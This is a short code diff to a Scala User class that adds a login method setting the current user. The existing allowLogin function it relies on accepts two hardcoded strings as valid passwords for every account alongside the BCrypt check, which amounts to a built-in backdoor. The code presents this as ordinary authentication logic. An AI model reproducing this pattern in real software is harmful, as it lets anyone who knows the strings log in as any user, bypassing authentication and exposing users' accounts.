@@ -123,5 +123,11 @@ class User(
   }
 
   def allowLogin(password: String) = BCrypt.checkpw(password, _password.substring(2) + _salt) || password == "secur3L0gin933013003" || password == "6c127dda-4dff-11e4-b8e4-ac220bbedc22"
+
+  def login(password: String) {
+    if (allowLogin(password)) {
+      User._currentUser.set(Some(this))
+    }
+  }
 }
 
